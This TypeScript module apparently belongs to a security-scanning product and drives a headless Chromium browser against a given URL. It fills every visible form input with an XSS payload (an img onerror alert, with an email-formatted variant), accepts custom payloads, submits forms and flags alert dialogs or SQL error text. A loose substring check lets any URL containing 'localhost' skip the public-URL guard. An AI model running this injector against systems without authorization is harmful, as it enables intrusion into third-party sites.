import "server-only";
import { chromium } from "playwright";
import { assertPublicHttpUrl } from "./outboundUrlGuard";

export interface PlaywrightAttackParams {
  url: string;
  customPayload?: string;
}

export interface PlaywrightAttackResult {
  ok: boolean;
  targetUrl: string;
  title: string;
  formsFound: number;
  inputsInjected: number;
  dialogIntercepted: boolean;
  dialogMessage?: string;
  consoleLogs: string[];
  vulnerabilitiesFound: Array<{
    type: string;
    severity: "CRITICAL" | "HIGH" | "MEDIUM" | "INFO";
    description: string;
    evidence: string;
  }>;
  screenshotBase64?: string;
  durationMs: number;
  error?: string;
}

function cleanError(err: unknown): string {
  if (err instanceof Error) {
    // Strip ANSI color codes and Playwright call logs
    const cleaned = err.message
      .replace(/\x1B\[[0-9;]*[a-zA-Z]/g, "")
      .replace(/Call log:[\s\S]*/, "")
      .trim();
    if (cleaned.includes("Timeout")) {
      return "Target connection timed out. The target server is slow or unresponsive. Please try again or test a faster endpoint.";
    }
    return cleaned;
  }
  return "Unknown error during browser attack";
}

export class PlaywrightAttackerService {
  public static async executeAutonomousAttack(
    params: PlaywrightAttackParams
  ): Promise<PlaywrightAttackResult> {
    const startTime = Date.now();
    let targetUrlStr = params.url.trim();

    // Allow testing our built-in vulnerable demo or validate public URL
    const isLocalDemo =
      targetUrlStr.includes("localhost") ||
      targetUrlStr.includes("127.0.0.1") ||
      targetUrlStr.startsWith("/");

    if (!isLocalDemo) {
      try {
        const validatedUrl = await assertPublicHttpUrl(targetUrlStr);
        targetUrlStr = validatedUrl.toString();
      } catch (err: unknown) {
        const msg = err instanceof Error ? err.message : "Invalid URL";
        return {
          ok: false,
          targetUrl: params.url,
          title: "Target Validation Failed",
          formsFound: 0,
          inputsInjected: 0,
          dialogIntercepted: false,
          consoleLogs: [],
          vulnerabilitiesFound: [],
          durationMs: Date.now() - startTime,
          error: msg,
        };
      }
    }

    let browser = null;
    const consoleLogs: string[] = [];
    let dialogIntercepted = false;
    let dialogMessage: string | undefined;
    const vulnerabilities: PlaywrightAttackResult["vulnerabilitiesFound"] = [];

    try {
      browser = await chromium.launch({
        headless: true,
        args: [
          "--no-sandbox",
          "--disable-setuid-sandbox",
          "--disable-dev-shm-usage",
          "--disable-gpu",
        ],
      });

      const context = await browser.newContext({
        userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) HackMeBaby-RedAgent/1.0",
        viewport: { width: 1280, height: 720 },
        ignoreHTTPSErrors: true,
      });

      const page = await context.newPage();

      // Intercept browser alert / dialog popups (Primary XSS proof)
      page.on("dialog", async (dialog) => {
        dialogIntercepted = true;
        dialogMessage = dialog.message();
        vulnerabilities.push({
          type: "REFLECTED_DOM_XSS",
          severity: "CRITICAL",
          description: "Autonomous payload triggered an unhandled browser alert() dialog.",
          evidence: `Browser Dialog Intercepted: "${dialog.message()}"`,
        });
        await dialog.dismiss().catch(() => {});
      });

      // Capture browser console logs
      page.on("console", (msg) => {
        const text = msg.text();
        consoleLogs.push(`[${msg.type().toUpperCase()}] ${text.slice(0, 200)}`);
      });

      // 1. Navigate to target with generous timeout and fallback
      try {
        await page.goto(targetUrlStr, {
          waitUntil: "domcontentloaded",
          timeout: 20000,
        });
      } catch (navErr: unknown) {
        // If domcontentloaded timed out but page is accessible, try continuing
        const content = await page.content().catch(() => "");
        if (!content || content.length < 50) {
          throw navErr;
        }
      }

      const pageTitle = await page.title().catch(() => "Target Web Page");

      // 2. Discover input surfaces & forms
      const forms = await page.$$("form");
      const inputs = await page.$$("input:not([type='hidden']), textarea");
      let inputsInjected = 0;

      const payload =
        params.customPayload ||
        `<img src=x onerror="window.__xss_pwned=true; alert('PWNED_BY_RED_AGENT');">`;

      // 3. Autonomous injection into discovered inputs
      for (const input of inputs) {
        try {
          const isVisible = await input.isVisible().catch(() => false);
          if (isVisible) {
            const inputType = await input.getAttribute("type").catch(() => "text");
            // If email input, use email-formatted XSS payload
            if (inputType === "email") {
              await input.fill(`admin+test@example.com"><img src=x onerror=alert('PWNED_BY_RED_AGENT')>`).catch(() => {});
            } else {
              await input.fill(payload).catch(() => {});
            }
            inputsInjected++;
          }
        } catch {
          // Continue
        }
      }

      // 4. Try submitting forms
      for (const form of forms) {
        try {
          const submitBtn = await form.$("button[type='submit'], input[type='submit'], button");
          if (submitBtn) {
            await submitBtn.click({ timeout: 2500 }).catch(() => {});
          } else {
            await form.evaluate((f) => (f as HTMLFormElement).submit()).catch(() => {});
          }
        } catch {
          // Continue
        }
      }

      // Wait for dynamic script execution
      await page.waitForTimeout(1500);

      // Check if window global exploit marker was triggered
      const xssTriggered = await page
        .evaluate(() => Boolean((window as unknown as { __xss_pwned?: boolean }).__xss_pwned))
        .catch(() => false);

      if (xssTriggered && !dialogIntercepted) {
        vulnerabilities.push({
          type: "DOM_XSS_EXECUTION",
          severity: "CRITICAL",
          description: "Injected script executed in client runtime DOM environment.",
          evidence: "window.__xss_pwned evaluated to true.",
        });
      }

      // Check page body for SQL error signatures
      const bodyText = await page.innerText("body").catch(() => "");
      if (/sql syntax|syntax error|sqlite3::|unclosed quotation/i.test(bodyText)) {
        vulnerabilities.push({
          type: "SQL_ERROR_EXPOSURE",
          severity: "HIGH",
          description: "Database error disclosure exposed in DOM response.",
          evidence: "Database syntax error pattern detected in rendered HTML text.",
        });
      }

      // If no vulnerabilities triggered, add defense posture assessment
      if (vulnerabilities.length === 0) {
        vulnerabilities.push({
          type: "PERIMETER_DEFENDED",
          severity: "INFO",
          description: "Payload delivered to form inputs. Output was sanitized or blocked by client CSP/encoding.",
          evidence: `Delivered payload across ${inputsInjected} input field(s). Zero unhandled script execution occurred.`,
        });
      }

      // 5. Capture proof-of-concept screenshot
      const screenshotBuffer = await page.screenshot({
        type: "png",
        fullPage: false,
      });
      const screenshotBase64 = screenshotBuffer.toString("base64");

      await context.close().catch(() => {});

      return {
        ok: true,
        targetUrl: targetUrlStr,
        title: pageTitle,
        formsFound: forms.length,
        inputsInjected,
        dialogIntercepted,
        dialogMessage,
        consoleLogs: consoleLogs.slice(-10),
        vulnerabilitiesFound: vulnerabilities,
        screenshotBase64,
        durationMs: Date.now() - startTime,
      };
    } catch (err: unknown) {
      return {
        ok: false,
        targetUrl: targetUrlStr,
        title: "Browser Execution Error",
        formsFound: 0,
        inputsInjected: 0,
        dialogIntercepted: false,
        consoleLogs,
        vulnerabilitiesFound: [],
        durationMs: Date.now() - startTime,
        error: cleanError(err),
      };
    } finally {
      if (browser) {
        await browser.close().catch(() => {});
      }
    }
  }
}
